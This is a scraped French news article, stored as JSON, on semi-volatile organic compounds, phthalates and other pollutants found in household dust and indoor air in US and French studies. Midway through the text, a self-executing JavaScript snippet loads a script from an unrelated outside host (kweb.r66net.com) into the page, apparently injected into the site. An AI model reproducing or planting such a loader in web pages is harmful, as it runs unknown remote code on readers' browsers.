{"title": "Trop de polluants dans les poussieres de nos maisons (MAJ)", "newspaper": "Futura Sciences", "author": ["AFP PARIS"], "date_publi": "2016-09-21", "content": "L'air interieur et les poussieres de nos logements contiennent des polluants potentiellement nocifs. C'est le cas dans 90 % des foyers inspectes par des chercheurs aux Etats-Unis, constate une etude recente. De nombreuses sources sont identifiees. Dans un article paru dans  Environmental Science & Technology , les scientifiques ont analyse 26 etudes portant sur des poussieres recuperees dans 14 Etats des Etats-Unis. Les resultats ont permis de mettre en evidence 45 produits chimiques issus de produits d'entretien, de meubles, de parfums... Dix de ces  molecules  se retrouvaient dans 90 % des poussieres recoltees, ce qui suggere que la plupart de la population etait exposee a ces  polluants . Parmi ces molecules se trouvaient par exemple des  phtalates , des retardateurs de flamme, des phenols... Beaucoup etaient des  perturbateurs endocriniens  ou potentiellement  cancerogenes . Les chercheurs s'inquietent que les enfants soient particulierement exposes, parce qu'ils ils jouent souvent sur le sol et risquent de mettre a la bouche des poussieres. ----------  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Article initial paru le 17/06/2015 L'Observatoire de la qualite de l' air  interieur a mesure la diversite des polluants presents dans l'air ou les poussieres des logements. Resultat : on y trouve des dizaines de molecules provenant de multiples produits chimiques couramment utilises. Leurs effets sur la sante sont plus ou moins connus et les concentrations acceptables sont souvent mal definies. L'air et les poussieres au sol de nos logements contiennent des dizaines de substances chimiques issues de produits de la vie quotidienne, revele une enquete d'une ampleur inedite sur la  pollution interieure  publiee jeudi par l'Observatoire de la qualite de l'air interieur ( OQAI ). Ces substances chimiques, plus precisement les composes organiques semi-volatils, sont suspectees d'avoir des effets sur les systemes nerveux, immunitaire et hormonal. Les travaux pour etablir les niveaux de concentration potentiellement toxiques sont toujours en cours. La campagne de mesures menee  << apporte des premiers elements utiles pour evaluer les risques sanitaires potentiels lies a ces substances >> , selon l'OQAI qui indique que ces composes sont  << omnipresents >>  avec  << des concentrations tres variables selon les substances >> . Les  composes organiques semi-volatils  sont issus d'objets contenant des  plastiques  ( revetements de sol ,  ordinateurs , cables, meubles, textiles, etc.), de produits d'entretien (lessives, detergents) et cosmetiques (parfums, produits d'hygiene corporelle), d'insecticides (traitement des plantes, antiparasitaires pour les animaux) ou encore de residus de  combustion  (tabac, encens, chauffage au  bois ). Dans les poussieres au sol, 32 composes sur 48  substances chimiques  recherchees ont ete detectes dans plus d'un  logement  sur deux (67 %). Dans l'air, 35 des 66 substances recherchees etaient presentes dans plus d'un logement sur deux (53 %).  << Certains de ces composes organiques semi-volatils, notamment les  phtalates  (plastiques souples) et les  hydrocarbures aromatiques polycycliques  (residus de combustion), sont detectes dans quasiment tous les logements, a la fois dans l'air et dans les poussieres >> , precise l'OQAI. Interview 1/5 : la pollution de l'air est omnipresente                       Nous sommes en permanence confrontes a une menace invisible et insidieuse : la pollution atmospherique. Philippe Hubert, directeur des risques chroniques de l'Ineris (Institut national de l'environnement industriel et des risques), nous en explique les causes et nous decrit les normes en matiere de pollution de l'air.                                       ", "theme": "maison"}